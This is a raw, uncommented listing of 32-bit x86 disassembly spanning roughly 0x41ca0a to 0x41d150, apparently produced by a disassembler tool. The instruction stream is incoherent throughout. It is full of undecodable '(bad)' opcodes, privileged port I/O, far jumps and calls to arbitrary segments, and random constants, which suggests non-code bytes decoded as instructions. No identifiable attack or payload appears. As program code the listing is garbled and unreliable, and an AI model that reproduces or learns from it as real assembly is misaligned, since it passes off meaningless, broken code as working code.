  41ca0a:	fs data16 (bad) 
  41ca0d:	mov    esp,0x5b1f905f
  41ca12:	mov    esi,0x9a062934
  41ca17:	adc    BYTE PTR [esi],cl
  41ca19:	int3   
  41ca1a:	mov    esi,DWORD PTR [ecx+0x2b]
  41ca1d:	push   0xb
  41ca1f:	dec    edi
  41ca20:	dec    esp
  41ca21:	fcmovnu st,st(0)
  41ca23:	test   eax,0x8db26e07
  41ca28:	fmul   DWORD PTR [edx+ebp*2-0x121c373f]
  41ca2f:	aas    
  41ca30:	sub    esp,DWORD PTR [esi-0x1]
  41ca33:	cmp    esi,DWORD PTR [ebx+0xf]
  41ca36:	mov    esp,0x614e0444
  41ca3b:	inc    edx
  41ca3c:	mov    eax,0x52eb3b32
  41ca41:	and    cl,BYTE PTR [eax+esi*8+0x1369052d]
  41ca48:	not    DWORD PTR [edi-0x23]
  41ca4b:	mov    al,ds:0xdab1bb51
  41ca50:	add    edi,DWORD PTR fs:[eax]
  41ca53:	push   0x1f
  41ca55:	test   eax,0xc3716d8
  41ca5a:	cmp    dh,BYTE PTR gs:[edi]
  41ca5d:	out    0x3c,eax
  41ca5f:	or     DWORD PTR [ebx-0x5438e764],esi
  41ca65:	fsubp  st(0),st
  41ca67:	mov    ebx,0xf4541b31
  41ca6c:	gs and al,0x5e
  41ca6f:	sub    dh,BYTE PTR [edx+0x3002fbb1]
  41ca75:	(bad)  
  41ca76:	out    0x6a,eax
  41ca78:	bound  ecx,QWORD PTR [ebx-0x119c5dda]
  41ca7e:	push   ebx
  41ca7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca80:	pop    esp
  41ca81:	imul   edx,DWORD PTR [ecx],0x57
  41ca84:	popf   
  41ca85:	loopne 0x41ca7a
  41ca87:	jne    0x41ca8b
  41ca89:	or     BYTE PTR [ecx-0x7],al
  41ca8c:	ja     0x41ca18
  41ca8e:	not    DWORD PTR [esi+eax*2-0x17fe52c2]
  41ca95:	outs   dx,BYTE PTR ds:[esi]
  41ca96:	push   eax
  41ca97:	das    
  41ca98:	mov    cl,0xc
  41ca9a:	push   ebx
  41ca9b:	stc    
  41ca9c:	xchg   edx,eax
  41ca9d:	jecxz  0x41cb19
  41ca9f:	jl     0x41cac1
  41caa1:	xor    ecx,DWORD PTR [esi]
  41caa3:	repnz mov al,ds:0x2fa87e14
  41caa9:	mov    bl,0x89
  41caab:	fs leave 
  41caad:	int3   
  41caae:	push   edx
  41caaf:	or     al,al
  41cab1:	sub    DWORD PTR [ecx],ecx
  41cab3:	ins    DWORD PTR es:[edi],dx
  41cab4:	shl    edi,cl
  41cab6:	mov    ah,BYTE PTR [eax+0x7cee8027]
  41cabc:	loopne 0x41ca70
  41cabe:	pop    esp
  41cabf:	push   ds
  41cac0:	mov    bh,0x3a
  41cac2:	lods   eax,DWORD PTR ds:[esi]
  41cac3:	stos   DWORD PTR es:[edi],eax
  41cac4:	push   ecx
  41cac5:	pop    ebp
  41cac6:	xor    BYTE PTR [ebx-0x5c],dl
  41cac9:	out    0xfb,eax
  41cacb:	in     eax,0x93
  41cacd:	mov    ebp,0x8bee82a6
  41cad2:	jmp    0xcd44:0x7f0682c6
  41cad9:	adc    BYTE PTR [eax],0x61
  41cadc:	fdivr  DWORD PTR [edi+ecx*8]
  41cadf:	nop
  41cae0:	mov    bl,0x98
  41cae2:	and    ch,ch
  41cae4:	outs   dx,BYTE PTR ds:[esi]
  41cae5:	xor    BYTE PTR [edi],ah
  41cae7:	cldemote BYTE PTR [esi+ecx*2]
  41caeb:	push   eax
  41caec:	rcr    BYTE PTR [eax],1
  41caee:	imul   esp,DWORD PTR [edi-0x16a60371],0xffffffa0
  41caf5:	sti    
  41caf6:	pushf  
  41caf7:	jne    0x41cad3
  41caf9:	push   edi
  41cafa:	jmp    0x222c9cc6
  41caff:	in     al,dx
  41cb00:	pop    esi
  41cb01:	js     0x41cad1
  41cb03:	and    eax,0x97198774
  41cb08:	add    dl,dh
  41cb0a:	fstp   st(3)
  41cb0c:	in     eax,dx
  41cb0d:	mov    al,ds:0xb9778e9f
  41cb12:	mov    bh,0x63
  41cb14:	or     DWORD PTR [edi-0x616fc823],0x22
  41cb1b:	xchg   ecx,eax
  41cb1c:	jbe    0x41cb03
  41cb1e:	mov    al,ds:0xca8e46cb
  41cb23:	pushf  
  41cb24:	push   esi
  41cb25:	xchg   bh,dl
  41cb27:	(bad)  
  41cb28:	fistp  QWORD PTR [ecx-0x6e]
  41cb2b:	inc    edi
  41cb2c:	xor    al,0x53
  41cb2e:	inc    ebx
  41cb2f:	mov    WORD PTR [esi],cs
  41cb31:	mov    dl,0x74
  41cb33:	ds sbb al,0x12
  41cb36:	xchg   esp,ecx
  41cb38:	mov    eax,ds:0xebf7eaae
  41cb3d:	cmp    eax,0x580d04d4
  41cb42:	ins    BYTE PTR es:[edi],dx
  41cb43:	jno    0x41cb4d
  41cb45:	adc    ecx,0xab63fc64
  41cb4b:	jmp    0x13354de6
  41cb50:	neg    BYTE PTR [eax+0x4]
  41cb53:	lods   al,BYTE PTR ds:[esi]
  41cb54:	pop    edx
  41cb55:	xchg   edx,eax
  41cb56:	fnsave [esi+0x79]
  41cb59:	je     0x41cb84
  41cb5b:	mov    eax,ds:0x5cb6dcfe
  41cb60:	jb     0x41cae4
  41cb62:	scas   eax,DWORD PTR es:[edi]
  41cb63:	or     BYTE PTR ds:0x1e13dd5a,al
  41cb69:	add    DWORD PTR [ebx+edi*1-0x758abce4],esp
  41cb70:	xor    ch,BYTE PTR [eax]
  41cb72:	les    edi,FWORD PTR [ebx-0x8]
  41cb75:	loop   0x41cb41
  41cb77:	out    dx,al
  41cb78:	jae    0x41cb06
  41cb7a:	icebp  
  41cb7b:	jl     0x41cbc0
  41cb7d:	xor    eax,0x6148dc90
  41cb82:	lds    edi,FWORD PTR cs:[ebp+edx*8+0x3e]
  41cb87:	ds jnp 0x41cb2f
  41cb8a:	mov    eax,ds:0xa59595d6
  41cb8f:	ror    BYTE PTR [esi],1
  41cb91:	nop
  41cb92:	inc    ecx
  41cb93:	sub    al,0xf6
  41cb95:	mov    ebx,0x49a394
  41cb9a:	adc    ah,bh
  41cb9c:	mov    esp,0xe2c5f47f
  41cba1:	popf   
  41cba2:	mov    al,0xdd
  41cba4:	and    eax,0xa87cb88d
  41cba9:	sub    BYTE PTR [edi+0x2af69670],bl
  41cbaf:	adc    dh,BYTE PTR [eax+0x63]
  41cbb2:	sahf   
  41cbb3:	(bad)  
  41cbb4:	push   cs
  41cbb5:	rcl    DWORD PTR [edx-0x3e4fce7f],1
  41cbbb:	push   es
  41cbbc:	pop    esp
  41cbbd:	jbe    0x41cba7
  41cbbf:	outs   dx,DWORD PTR ds:[esi]
  41cbc0:	mov    cs,WORD PTR [esi]
  41cbc2:	xchg   BYTE PTR [eax+eax*2+0x7f],bh
  41cbc6:	inc    ebp
  41cbc7:	pop    edx
  41cbc8:	outs   dx,BYTE PTR ds:[esi]
  41cbc9:	jb     0x41cb7c
  41cbcb:	mov    DWORD PTR ds:0x74f7e057,ebp
  41cbd1:	dec    esp
  41cbd2:	int3   
  41cbd3:	push   ecx
  41cbd4:	xchg   DWORD PTR [eax+0xefabdf5],eax
  41cbda:	ins    DWORD PTR es:[edi],dx
  41cbdb:	jns    0x41cbc5
  41cbdd:	sub    al,0x74
  41cbdf:	mov    ecx,0xa490a3fe
  41cbe4:	addr16 pusha 
  41cbe6:	cli    
  41cbe7:	sub    al,0x3e
  41cbe9:	(bad)
  41cbec:	lods   eax,DWORD PTR ds:[esi]
  41cbed:	cmp    ah,BYTE PTR [edi-0x62]
  41cbf0:	pop    ds
  41cbf1:	lods   al,BYTE PTR ds:[esi]
  41cbf2:	sub    al,0xb1
  41cbf4:	dec    eax
  41cbf5:	xchg   BYTE PTR [ecx-0x3862c74c],bl
  41cbfb:	pusha  
  41cbfc:	sbb    BYTE PTR [ebp-0x5bdcf043],dh
  41cc02:	adc    ebp,DWORD PTR [ecx-0x60a575ff]
  41cc08:	out    dx,al
  41cc09:	add    eax,0xc2914359
  41cc0e:	adc    BYTE PTR [edi-0x19333b4c],cl
  41cc14:	inc    esi
  41cc15:	adc    eax,0x61a2f48e
  41cc1a:	mov    al,ds:0xd5a3b031
  41cc1f:	shl    ebp,cl
  41cc21:	mov    ch,0x38
  41cc23:	mov    al,ds:0xbfac7129
  41cc28:	jae    0x41cc75
  41cc2a:	sub    eax,edx
  41cc2c:	and    BYTE PTR [esi-0x46],bl
  41cc2f:	jmp    0x41cbfa
  41cc31:	scas   al,BYTE PTR es:[edi]
  41cc32:	call   0x73d6:0xfcd49c0
  41cc39:	popa   
  41cc3a:	jl     0x41cc2f
  41cc3c:	pop    edi
  41cc3d:	lods   al,BYTE PTR ds:[esi]
  41cc3e:	pusha  
  41cc3f:	xchg   ebp,eax
  41cc40:	adc    eax,0x9b1350aa
  41cc45:	and    BYTE PTR [edx-0x2c40fdf1],bl
  41cc4b:	retf   
  41cc4c:	push   esi
  41cc4d:	outs   dx,BYTE PTR ds:[esi]
  41cc4e:	lock pusha 
  41cc50:	les    esi,FWORD PTR [ebp+0x72]
  41cc53:	repz ds test eax,0x50320ca7
  41cc5a:	pop    ebp
  41cc5b:	ins    DWORD PTR es:[edi],dx
  41cc5c:	push   esi
  41cc5d:	rcl    BYTE PTR [ebx-0x548fcd9c],cl
  41cc63:	sahf   
  41cc64:	sub    cl,BYTE PTR [edx-0x7bde4997]
  41cc6a:	mov    DWORD PTR [eax],edx
  41cc6c:	inc    edx
  41cc6d:	stos   BYTE PTR es:[edi],al
  41cc6e:	in     eax,0x49
  41cc70:	out    dx,al
  41cc71:	repz and BYTE PTR [ecx+0x18],bl
  41cc75:	xchg   esp,eax
  41cc76:	das    
  41cc77:	mov    ch,0xd3
  41cc79:	mov    edi,0x17fe83d8
  41cc7e:	sub    DWORD PTR [edi-0x1507e90d],edx
  41cc84:	push   ebx
  41cc85:	call   0xc7c:0xd2f6ef22
  41cc8c:	loop   0x41ccf6
  41cc8e:	scas   al,BYTE PTR es:[edi]
  41cc8f:	push   ds
  41cc90:	in     al,dx
  41cc91:	cwde   
  41cc92:	mov    dl,0x8d
  41cc94:	stos   BYTE PTR es:[edi],al
  41cc95:	call   0x6f3d:0x20e48070
  41cc9c:	cmp    BYTE PTR [edx-0x3a26865b],bh
  41cca2:	and    BYTE PTR [eax+0x6c6cb389],al
  41cca8:	outs   dx,DWORD PTR ds:[esi]
  41cca9:	xchg   esi,eax
  41ccaa:	push   ecx
  41ccab:	cmc    
  41ccac:	imul   ecx,ebp,0xce19c2c5
  41ccb2:	add    DWORD PTR ds:0x4f73f953,eax
  41ccb8:	je     0x41cc5b
  41ccba:	retf   
  41ccbb:	es jno 0x41cc74
  41ccbe:	mov    cs,WORD PTR cs:[ecx]
  41ccc1:	out    dx,al
  41ccc2:	mov    eax,0x362066f9
  41ccc7:	loop   0x41cd2f
  41ccc9:	paddd  mm7,mm2
  41cccc:	pop    eax
  41cccd:	pop    esi
  41ccce:	or     dl,BYTE PTR [ebp+0x61]
  41ccd1:	sub    al,0xa7
  41ccd3:	pop    ebx
  41ccd4:	or     al,0x8b
  41ccd6:	lea    edi,[esi-0x75]
  41ccd9:	scas   al,BYTE PTR es:[edi]
  41ccda:	pop    eax
  41ccdb:	xor    BYTE PTR [ebx-0x72],bl
  41ccde:	pop    ebx
  41ccdf:	out    dx,eax
  41cce0:	xchg   BYTE PTR [ebx],ch
  41cce2:	sbb    DWORD PTR [esi+ebx*2-0x38f5a582],ebp
  41cce9:	sub    dl,bh
  41cceb:	ret    
  41ccec:	jno    0x41cd67
  41ccee:	xchg   ebx,eax
  41ccef:	lahf   
  41ccf0:	inc    eax
  41ccf1:	mov    BYTE PTR [edi],bh
  41ccf3:	inc    ecx
  41ccf4:	retf   
  41ccf5:	mov    eax,ds:0x7836db64
  41ccfa:	mov    cl,0x5a
  41ccfc:	pop    edx
  41ccfd:	sbb    al,0xeb
  41ccff:	jae    0x41cd55
  41cd01:	call   0xe9d64f54
  41cd06:	int    0xe3
  41cd08:	sahf   
  41cd09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd0a:	cmp    ecx,esp
  41cd0c:	and    ebp,DWORD PTR [edx+0x4b]
  41cd0f:	pop    ds
  41cd10:	enter  0xa553,0xc2
  41cd14:	xchg   DWORD PTR [esi+0x207a21ed],edi
  41cd1a:	aam    0x4f
  41cd1c:	test   al,0x5b
  41cd1e:	xor    BYTE PTR [edi-0x24e35b98],0x45
  41cd25:	(bad)  
  41cd26:	iret   
  41cd27:	pop    edx
  41cd28:	push   eax
  41cd29:	push   edi
  41cd2a:	cli    
  41cd2b:	cmp    ecx,esp
  41cd2d:	pop    edx
  41cd2e:	push   ss
  41cd2f:	mov    BYTE PTR [esi],dh
  41cd31:	ja     0x41ccd0
  41cd33:	repz xchg esi,eax
  41cd35:	mov    bl,0xd9
  41cd37:	mov    edx,0x7543ec13
  41cd3c:	push   cs
  41cd3d:	pop    es
  41cd3e:	dec    ecx
  41cd3f:	push   edi
  41cd40:	rol    BYTE PTR [ebx],1
  41cd42:	mov    edi,esp
  41cd44:	arpl   WORD PTR [esp+esi*8],cx
  41cd47:	mov    esp,0xd4d7998c
  41cd4c:	mov    ds:0xb3ac973f,al
  41cd51:	add    dl,BYTE PTR [ecx]
  41cd53:	int    0x8d
  41cd55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd56:	fld    QWORD PTR ds:0x292f3eb4
  41cd5d:	push   0xffffff89
  41cd5f:	and    DWORD PTR [esi+esi*4-0x32ae7c20],ebx
  41cd66:	jecxz  0x41ccf9
  41cd68:	add    BYTE PTR [eax+ebx*2-0x4d79281a],dl
  41cd6f:	xor    BYTE PTR [ecx-0x2d],dl
  41cd72:	call   0xb73a:0x2b083eaf
  41cd79:	mov    bl,BYTE PTR [eax+0x43]
  41cd7c:	loopne 0x41cd4c
  41cd7e:	xchg   esi,eax
  41cd7f:	dec    esp
  41cd80:	push   ds
  41cd81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd82:	arpl   WORD PTR [ecx],cx
  41cd84:	(bad)  
  41cd85:	sub    eax,0x1667aa36
  41cd8a:	jmp    0x68ef:0xc4bd0d61
  41cd91:	sub    DWORD PTR [edi+edx*1+0x4c],edi
  41cd95:	push   0xe2453c57
  41cd9a:	pop    es
  41cd9b:	add    al,0xf6
  41cd9d:	jecxz  0x41ce1b
  41cd9f:	jns    0x41cd5c
  41cda1:	adc    eax,0x99ec1112
  41cda6:	inc    edi
  41cda7:	push   esp
  41cda8:	xchg   edx,eax
  41cda9:	pushf  
  41cdaa:	test   DWORD PTR [esp+esi*2-0xa],esi
  41cdae:	in     eax,dx
  41cdaf:	dec    esp
  41cdb0:	test   eax,0x6b1bf9cd
  41cdb5:	jae    0x41ce18
  41cdb7:	lea    esi,[esp+eiz*2-0x1b48e212]
  41cdbe:	jecxz  0x41cdc1
  41cdc0:	imul   al
  41cdc2:	enter  0xfa00,0x61
  41cdc6:	(bad)  
  41cdc7:	je     0x41cdb7
  41cdc9:	(bad)
  41cdcd:	pop    es
  41cdce:	fldcw  WORD PTR [edx]
  41cdd0:	inc    ebx
  41cdd1:	fisub  DWORD PTR [ecx+0x1c285206]
  41cdd7:	push   eax
  41cdd8:	aam    0x67
  41cdda:	add    eax,0x81133777
  41cddf:	div    bl
  41cde1:	pop    ds
  41cde2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cde3:	retf   
  41cde4:	add    edx,esp
  41cde6:	dec    esi
  41cde7:	std    
  41cde8:	scas   al,BYTE PTR es:[edi]
  41cde9:	(bad)
  41cdec:	sub    dl,BYTE PTR [ecx]
  41cdee:	rcl    BYTE PTR [ecx],cl
  41cdf0:	inc    esi
  41cdf1:	mov    edi,0x7bf9d1c4
  41cdf6:	sbb    ecx,edx
  41cdf8:	and    bh,BYTE PTR [ecx-0xd]
  41cdfb:	jmp    0xa78b2f2f
  41ce00:	test   al,0x2e
  41ce02:	mov    dl,BYTE PTR [ebx-0x37a915e0]
  41ce08:	ja     0x41cde6
  41ce0a:	lods   eax,DWORD PTR ds:[esi]
  41ce0b:	mov    bl,0x14
  41ce0d:	cld    
  41ce0e:	das    
  41ce0f:	out    0xcd,al
  41ce11:	sbb    al,0x9b
  41ce13:	iret   
  41ce14:	fsubr  QWORD PTR [ecx-0x30]
  41ce17:	je     0x41ce23
  41ce19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce1a:	test   eax,0x917ea519
  41ce1f:	pop    edx
  41ce20:	mov    ds:0x4ad1e6b6,al
  41ce25:	stc    
  41ce26:	(bad)  
  41ce27:	dec    ecx
  41ce28:	sub    al,bh
  41ce2a:	jge    0x41cde1
  41ce2c:	jmp    0x41ce62
  41ce2e:	adc    esi,DWORD PTR [ebx]
  41ce30:	xor    al,0x49
  41ce32:	push   es
  41ce33:	xchg   ebx,eax
  41ce34:	and    esi,DWORD PTR [edx]
  41ce36:	cmp    eax,0xc9bc69fd
  41ce3b:	inc    eax
  41ce3c:	pop    esp
  41ce3d:	mov    BYTE PTR [esi+0xc951450],cl
  41ce43:	mov    es,WORD PTR [ebx]
  41ce45:	add    al,0xdf
  41ce47:	pop    esi
  41ce48:	dec    edx
  41ce49:	dec    esi
  41ce4a:	loop   0x41cec3
  41ce4c:	es cld 
  41ce4e:	xor    DWORD PTR [ebx+0x6e3f050f],ebx
  41ce54:	mov    ebp,edi
  41ce56:	xchg   BYTE PTR [ebx-0x13d56abb],dh
  41ce5c:	add    DWORD PTR [esi],ecx
  41ce5e:	iret   
  41ce5f:	and    dl,BYTE PTR [edx+0x27]
  41ce62:	xchg   ecx,eax
  41ce63:	test   eax,0xaeae50f6
  41ce68:	sub    al,dl
  41ce6a:	mov    BYTE PTR [esi+0x2dbb3218],bl
  41ce70:	push   0xfffffff6
  41ce72:	fcmove st,st(1)
  41ce74:	jmp    0xe88a:0x245f8a70
  41ce7b:	jge    0x41ce80
  41ce7d:	loope  0x41ce48
  41ce7f:	mov    bl,0xc8
  41ce81:	out    0xaf,al
  41ce83:	mov    esp,0xe0364003
  41ce88:	adc    ebx,DWORD PTR [ebx]
  41ce8a:	or     dh,BYTE PTR [edi]
  41ce8c:	sti    
  41ce8d:	xchg   esi,eax
  41ce8e:	call   0xb3f96bd5
  41ce93:	sahf   
  41ce94:	ds and al,0xf8
  41ce97:	leave  
  41ce98:	sub    ah,BYTE PTR [eax+edx*1+0x31]
  41ce9c:	int3   
  41ce9d:	ins    BYTE PTR es:[edi],dx
  41ce9e:	xor    edi,esi
  41cea0:	cs inc ecx
  41cea2:	loope  0x41ce5e
  41cea4:	dec    esi
  41cea5:	cs in  al,0xcb
  41cea8:	mov    ah,0x26
  41ceaa:	sbb    BYTE PTR [ecx],cl
  41ceac:	js     0x41ce92
  41ceae:	mov    eax,0xb61d56b5
  41ceb3:	and    bh,0x88
  41ceb6:	jmp    0xf0a5:0x646ce8c4
  41cebd:	pop    es
  41cebe:	xchg   esi,eax
  41cebf:	xchg   esp,eax
  41cec0:	push   0xffffffc5
  41cec2:	mov    ds:0xbf32ec8b,eax
  41cec7:	mov    al,0x77
  41cec9:	mov    ebp,0x48b2e077
  41cece:	hlt    
  41cecf:	scas   al,BYTE PTR es:[edi]
  41ced0:	sti    
  41ced1:	dec    eax
  41ced2:	test   eax,0x40d3f870
  41ced7:	pop    edi
  41ced8:	outs   dx,DWORD PTR ds:[esi]
  41ced9:	pop    es
  41ceda:	call   0x2846:0xd182caea
  41cee1:	icebp  
  41cee2:	mov    edx,0x4eb734a4
  41cee7:	add    BYTE PTR [esi-0x373f338e],0xb5
  41ceee:	ins    BYTE PTR es:[edi],dx
  41ceef:	pop    eax
  41cef0:	pop    ebp
  41cef1:	xor    eax,0x4e10c036
  41cef6:	ficom  WORD PTR [esi]
  41cef8:	into   
  41cef9:	lods   al,BYTE PTR ds:[esi]
  41cefa:	js     0x41cf68
  41cefc:	adc    eax,0x759d38eb
  41cf01:	push   0x9be14269
  41cf06:	mov    ch,0xb5
  41cf08:	mov    ecx,0x2778981d
  41cf0d:	es jecxz 0x41cf03
  41cf10:	pop    edi
  41cf11:	loop   0x41cec4
  41cf13:	add    ebx,eax
  41cf15:	std    
  41cf16:	jge    0x41cf44
  41cf18:	sahf   
  41cf19:	ret    
  41cf1a:	pop    ebx
  41cf1b:	scas   al,BYTE PTR es:[edi]
  41cf1c:	xchg   esp,eax
  41cf1d:	fisttp DWORD PTR [edi+ebp*8+0x31]
  41cf21:	clc    
  41cf22:	fstp   st(6)
  41cf24:	fdivp  st(0),st
  41cf26:	iret   
  41cf27:	mov    edi,0xfc0bd69e
  41cf2c:	int    0x86
  41cf2e:	xchg   edi,eax
  41cf2f:	pushf  
  41cf30:	pop    ebx
  41cf31:	in     eax,dx
  41cf32:	sbb    eax,DWORD PTR [edx-0x63]
  41cf35:	jg     0x41cf34
  41cf37:	jns    0x41cf46
  41cf39:	xor    al,cl
  41cf3b:	std    
  41cf3c:	push   ss
  41cf3d:	call   0x7156:0xad12672c
  41cf44:	mov    ah,0xfe
  41cf46:	cwde   
  41cf47:	pop    edx
  41cf48:	or     al,0xd6
  41cf4a:	in     al,dx
  41cf4b:	adc    esp,esp
  41cf4d:	mov    edi,0xa3c6c1b6
  41cf52:	repz call 0xd65ab62e
  41cf58:	imul   ebx,DWORD PTR [eax-0x22],0x46
  41cf5c:	mov    ecx,0xccc5f267
  41cf61:	aas    
  41cf62:	int    0x6e
  41cf64:	(bad)  
  41cf65:	xor    al,BYTE PTR [ebp+0x65]
  41cf68:	fwait
  41cf69:	js     0x41cefb
  41cf6b:	or     DWORD PTR [edi],esp
  41cf6d:	push   0x84f10669
  41cf72:	popa   
  41cf73:	loope  0x41cf35
  41cf75:	aam    0xb6
  41cf77:	or     esi,edx
  41cf79:	cmc    
  41cf7a:	stc    
  41cf7b:	mov    al,0x49
  41cf7d:	sub    cl,BYTE PTR [esi+edx*2+0x3c1ee43d]
  41cf84:	or     DWORD PTR [ebx-0x34],ebp
  41cf87:	enter  0xa9b1,0x55
  41cf8b:	or     DWORD PTR [edi],eax
  41cf8d:	dec    eax
  41cf8e:	scas   al,BYTE PTR es:[edi]
  41cf8f:	or     esp,ebx
  41cf91:	push   esi
  41cf92:	pop    ds
  41cf93:	sub    eax,DWORD PTR [edi]
  41cf95:	icebp  
  41cf96:	js     0x41cfa3
  41cf98:	call   0x5792:0x8a5750d7
  41cf9f:	fsubp  st(0),st
  41cfa1:	fld    DWORD PTR [ebp-0x6d00564c]
  41cfa7:	fld    DWORD PTR ds:0xfcc53410
  41cfad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfae:	push   esi
  41cfaf:	les    ecx,FWORD PTR [eax+0x24]
  41cfb2:	ror    BYTE PTR [ecx+0x443c5f7d],1
  41cfb8:	dec    edi
  41cfb9:	adc    al,0xd
  41cfbb:	dec    ecx
  41cfbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfbd:	fisttp WORD PTR [ecx+0x1c]
  41cfc0:	imul   BYTE PTR [esi-0x73]
  41cfc3:	shr    DWORD PTR [ecx],cl
  41cfc5:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41cfc7:	or     bl,BYTE PTR [eax-0x11]
  41cfca:	jg     0x41cf71
  41cfcc:	xchg   esp,eax
  41cfcd:	mov    ebp,0x826f158b
  41cfd2:	mov    ch,BYTE PTR [esi+0x387289c]
  41cfd8:	inc    edx
  41cfd9:	pop    esi
  41cfda:	or     ebp,edx
  41cfdc:	inc    eax
  41cfdd:	xchg   esp,eax
  41cfde:	push   edx
  41cfdf:	jp     0x41cfb6
  41cfe1:	outs   dx,BYTE PTR ds:[esi]
  41cfe2:	out    dx,eax
  41cfe3:	test   BYTE PTR cs:[edx+0x69],ah
  41cfe7:	xchg   ebx,eax
  41cfe8:	or     ecx,0x3ca89975
  41cfee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfef:	jne    0x41cf99
  41cff1:	cmp    ecx,DWORD PTR [edi]
  41cff3:	xchg   ebx,eax
  41cff4:	aaa    
  41cff5:	lods   al,BYTE PTR ds:[esi]
  41cff6:	test   eax,0xedc8a79e
  41cffb:	or     eax,DWORD PTR ds:0x4e01784f
  41d001:	retf   0x37b6
  41d004:	mov    bl,0xf
  41d006:	mov    ebp,0xe02c6bf3
  41d00b:	loopne 0x41d062
  41d00d:	xchg   DWORD PTR [eax],ecx
  41d00f:	inc    ebx
  41d010:	jo     0x41d07e
  41d012:	cmp    ch,dl
  41d014:	pop    ecx
  41d015:	sahf   
  41d016:	cmp    al,0x7d
  41d018:	ficomp DWORD PTR [ecx-0x14]
  41d01b:	adc    al,0xb5
  41d01d:	adc    cl,BYTE PTR [edx+0x9]
  41d020:	cmp    ah,bl
  41d022:	push   eax
  41d023:	imul   ecx,eax,0x4b
  41d026:	sbb    eax,0x7a363e8f
  41d02b:	in     eax,0x24
  41d02d:	or     edx,ecx
  41d02f:	pop    edi
  41d030:	test   DWORD PTR [edi+eiz*1],0x9caf27df
  41d037:	sti    
  41d038:	xor    ebx,esp
  41d03a:	fiadd  DWORD PTR [ecx]
  41d03c:	mov    bl,0x98
  41d03e:	mov    ds:0x832a7aeb,al
  41d043:	jns    0x41d091
  41d045:	sbb    dl,dl
  41d047:	mov    eax,ds:0xb7cb40b9
  41d04c:	(bad)  
  41d04d:	dec    ebx
  41d04e:	iret   
  41d04f:	sti    
  41d050:	add    al,dl
  41d052:	outs   dx,DWORD PTR ds:[esi]
  41d053:	mov    BYTE PTR [esi-0x19],0xd8
  41d057:	mov    al,BYTE PTR [ecx+0x6515f578]
  41d05d:	and    dh,dh
  41d05f:	jnp    0x41d096
  41d061:	sti    
  41d062:	dec    ebx
  41d063:	sbb    dh,BYTE PTR [ecx-0x4e0db49e]
  41d069:	lock retf 0xd097
  41d06d:	test   DWORD PTR ds:0x68ee2cc0,ecx
  41d073:	pop    DWORD PTR [ebp+0x64]
  41d076:	mov    WORD PTR [edi-0x1c],fs
  41d079:	and    al,0xc3
  41d07b:	retf   
  41d07c:	loopne 0x41d02a
  41d07e:	push   esi
  41d07f:	pop    ecx
  41d080:	ret    0xfb6e
  41d083:	pop    DWORD PTR [ebx+0x7b]
  41d086:	mov    eax,edi
  41d088:	lds    ebx,FWORD PTR [eax]
  41d08a:	xor    dl,BYTE PTR [ecx-0x64b9cffd]
  41d090:	sub    ecx,DWORD PTR [ebx]
  41d092:	imul   eax,DWORD PTR [ecx+0x65af2ee6],0x18
  41d099:	test   eax,0x1583678b
  41d09e:	mov    ebx,0x31f36df4
  41d0a3:	retf   0x34bb
  41d0a6:	int3   
  41d0a7:	repz int 0xe7
  41d0aa:	loop   0x41d070
  41d0ac:	mov    esp,0x5c6e4ea5
  41d0b1:	mov    ss,ecx
  41d0b3:	aam    0xb9
  41d0b5:	retf   
  41d0b6:	arpl   WORD PTR [edx-0xb],bx
  41d0b9:	mov    eax,0xd3e546b9
  41d0be:	adc    eax,0xf13f0664
  41d0c3:	dec    esp
  41d0c4:	pusha  
  41d0c5:	je     0x41d0c0
  41d0c7:	ret    
  41d0c8:	scas   eax,DWORD PTR es:[edi]
  41d0c9:	xchg   bl,al
  41d0cb:	adc    DWORD PTR [edi+0x534d8af9],0xffffffc0
  41d0d2:	inc    ebp
  41d0d3:	popf   
  41d0d4:	sbb    edx,eax
  41d0d6:	mov    ebx,0x220aec69
  41d0db:	push   ss
  41d0dc:	add    eax,0xbea9edc4
  41d0e1:	sbb    dl,BYTE PTR [esp+edi*1]
  41d0e4:	(bad)  
  41d0e5:	cmp    edi,ecx
  41d0e7:	lods   al,BYTE PTR ds:[esi]
  41d0e8:	jno    0x41d0cd
  41d0ea:	aad    0x73
  41d0ec:	cdq    
  41d0ed:	dec    eax
  41d0ee:	dec    edx
  41d0ef:	sbb    edx,ecx
  41d0f1:	fdivrp st(1),st
  41d0f3:	cmc    
  41d0f4:	pusha  
  41d0f5:	mov    esi,DWORD PTR [edx-0x1d]
  41d0f8:	fistp  WORD PTR [edi]
  41d0fa:	mov    dh,BYTE PTR [edx]
  41d0fc:	outs   dx,BYTE PTR ds:[esi]
  41d0fd:	ret    0x74b9
  41d100:	sahf   
  41d101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d102:	pop    ss
  41d103:	mov    esp,0x31fa01b1
  41d108:	aad    0x32
  41d10a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d10b:	lods   al,BYTE PTR ds:[esi]
  41d10c:	xchg   esi,eax
  41d10d:	sub    al,0x27
  41d10f:	sub    eax,0xf6c10cf8
  41d114:	addr16 mov ds:0x830,al
  41d118:	mov    al,ds:0xf6d52742
  41d11d:	jle    0x41d14e
  41d11f:	outs   dx,DWORD PTR ds:[esi]
  41d120:	jmp    0xcd8ccd52
  41d125:	iret   
  41d126:	int    0xad
  41d128:	sub    al,0x8
  41d12a:	(bad)  
  41d12b:	paddusb mm0,QWORD PTR [edx+0x1f18fe4f]
  41d132:	jmp    0x41d199
  41d134:	add    ebp,DWORD PTR [ebx]
  41d136:	in     al,0xda
  41d138:	daa    
  41d139:	sbb    eax,0xe7958104
  41d13e:	cmp    cl,al
  41d140:	ins    DWORD PTR es:[edi],dx
  41d141:	mov    edx,0xe3e92759
  41d146:	out    dx,al
  41d147:	jo     0x41d0f3
  41d149:	sub    al,0x21
  41d14b:	pop    ss
  41d14c:	pop    es
  41d14d:	lods   al,BYTE PTR ds:[esi]
  41d14e:	jge    0x41d1b6
  41d150:	cmp    BYTE PTR ds:0xdd2681f2,ah
